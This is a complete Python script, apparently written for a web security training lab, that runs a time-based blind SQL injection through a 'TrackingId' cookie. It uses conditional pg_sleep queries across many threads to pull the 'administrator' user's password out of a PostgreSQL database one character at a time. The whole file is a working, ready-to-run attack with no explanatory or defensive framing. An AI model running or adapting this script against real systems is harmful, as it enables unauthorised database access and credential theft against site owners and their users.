```python
import sys
import urllib.parse
import requests
import urllib3
import concurrent.futures

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Define proxies for debugging (e.g., using Burp Suite)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# Define a session for connection reuse
session = requests.Session()

# Enable persistent connections for faster requests
session.proxies.update(proxies)


def test_character(url, i, j, cookie_template):
    """
    Test a specific character position and ASCII value for the password.

    Args:
        url (str): Target URL.
        i (int): Character position.
        j (int): ASCII value of the character.
        cookie_template (dict): Template for cookies to be modified.

    Returns:
        bool: True if the character matches, False otherwise.
    """
    # Create the SQL injection payload
    sqli_payload = (
        "' || (SELECT CASE WHEN (1=1) THEN pg_sleep(10) else pg_sleep(-1) end from users where username='administrator' AND ascii(substr(password,%s,1))='%s') --"
        % (i, j)
    )

    # URL encode the payload
    sqli_payload_encoded = urllib.parse.quote(sqli_payload)

    # Inject the payload into the 'TrackingId' cookie
    cookie = cookie_template.copy()
    cookie['TrackingId'] += sqli_payload_encoded

    try:
        # Send the HTTP request with the crafted cookie
        r = session.get(url, cookies=cookie, verify=False, timeout=15)

        #elapsed_time = r.elapsed.total_seconds()
        # Look for differences in the response
        #return elapsed_time > 5
        return r.elapsed.total_seconds() > 5
    except requests.RequestException:
        return False


def sqli_password(url):
    """
    Perform a blind SQL injection attack to extract the administrator's password.

    Args:
        url (str): The target URL.

    Returns:
        None
    """
    password_extracted = ""
    max_length = 20  # Adjust as needed

    # Define the base cookie template
    cookie_template = {
        'TrackingId': 'DQvDw2UEZhDMhinX',  # Ensure this matches the working version
        'session': 'LB3r0opCmVgo3qM3p1D04kMAv2DMzTTv'  # Ensure this matches the working version
    }

    for i in range(1, max_length + 1):
        found = False

        # Test each character for the current position
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = {
                executor.submit(test_character, url, i, j, cookie_template): j for j in range(32, 127)
            }

            for future in concurrent.futures.as_completed(futures):
                j = futures[future]
                try:
                    if future.result():
                        password_extracted += chr(j)
                        sys.stdout.write(f"\rExtracted: {password_extracted}")
                        sys.stdout.flush()
                        found = True
                        break
                except Exception:
                    pass

        if not found:
            password_extracted += "?"

    print(f"\n[+] Password extraction complete: {password_extracted}")


def main():
    """
    Main function to handle input arguments and initiate the SQL injection process.

    Returns:
        None
    """
    if len(sys.argv) != 2:
        print("[+] Usage: %s <url>" % sys.argv[0])
        print("[+] Example: %s https://www.example.com" % sys.argv[0])
        sys.exit(1)

    url = sys.argv[1]
    print("[+] Retrieving password...")
    sqli_password(url)


if __name__ == "__main__":
    main()
```